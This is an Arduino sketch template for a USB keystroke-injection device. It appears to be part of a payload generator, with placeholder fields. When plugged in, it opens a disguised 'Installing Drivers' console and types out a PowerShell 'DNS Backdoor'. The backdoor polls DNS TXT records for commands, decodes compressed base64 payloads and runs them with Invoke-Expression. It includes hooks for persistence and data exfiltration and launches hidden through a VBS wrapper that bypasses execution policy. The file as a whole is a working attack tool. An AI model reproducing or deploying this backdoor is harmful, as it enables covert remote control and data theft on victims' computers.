void setup(){
	Keyboard.begin();
}
void loop(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println(F("echo $pn = $env:COMPUTERNAME + \"  DNS Backdoor\" > %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $user = \"INPUT1\" >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $pass = \"INPUT2\" >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $dev = \"INPUT3\" >> %temp%\\dtb.ps1"));

  String fn = "dtb";

  PERSCALLS

  delay(1000);
  Keyboard.println(F("echo while(1){  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $exec = 0  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo sleep 5  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $gtc = (iex \"nslookup -querytype=txt INPUT4 INPUT10\")  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $tmp = $gtc ^| sls -pattern ^\"`^\"^\" >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $st = $tmp -split(^\"`^\"^\")[0] >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo if ($st[1] -eq \"INPUT5\"){ >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $gtm = (iex \"nslookup -querytype=txt INPUT6 INPUT10\")  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $temp = $gtm ^| sls -pattern ^\"`^\"^\" >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $cmd = $temp -split(^\"`^\"^\")[0] >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $pv = iex $cmd[1]  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $exec++ } >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo if ($st[1] -eq \"INPUT7\"){ >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $gtm = (iex \"nslookup -querytype=txt INPUT8 INPUT10\")  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $temp = $gtm ^| sls -pattern ^\"`^\"^\" >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $tmp1 = \"\"  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo foreach ($txt in $temp){$tmp1 = $tmp1 + $txt}  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $encdata = $tmp1 -replace '\\s+', \"\" -replace ^\"^`\"\", \"\"  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $dec = [System.Convert]::FromBase64String($encdata)  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $ms = New-Object System.IO.MemoryStream >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $ms.Write($dec, 0, $dec.Length) >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $ms.Seek(0,0) ^| Out-Null  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress) >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $sr = New-Object System.IO.StreamReader($cs) >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $command = $sr.readtoend() >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $pre = ls function:\\ >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $pv = Invoke-Expression $command >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $post = ls function:\\ >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $dobj = diff $pre $post >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $fname = $dobj.InputObject.Name >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo if ($fname -ne $null) {$pv = Invoke-Expression $fname} >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo $exec++ } >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo if ($exec -eq 1){ >> %temp%\\dtb.ps1"));
  String fn = "dtb";
  String fp;
  EXFILCALLS

  Keyboard.println(F("echo sleep 60 }  >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo if ($st[1] -eq \"INPUT9\"){ break }} >> %temp%\\dtb.ps1"));
  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dtb.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dtb.ps1\"),0,true >> %temp%\\dtb.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\dtb.vbs"));
  delay(1000);
  Keyboard.println(F("exit"));
  while(true){};
}

 DEFS
 EXFILDEFS
 PERSDEFS
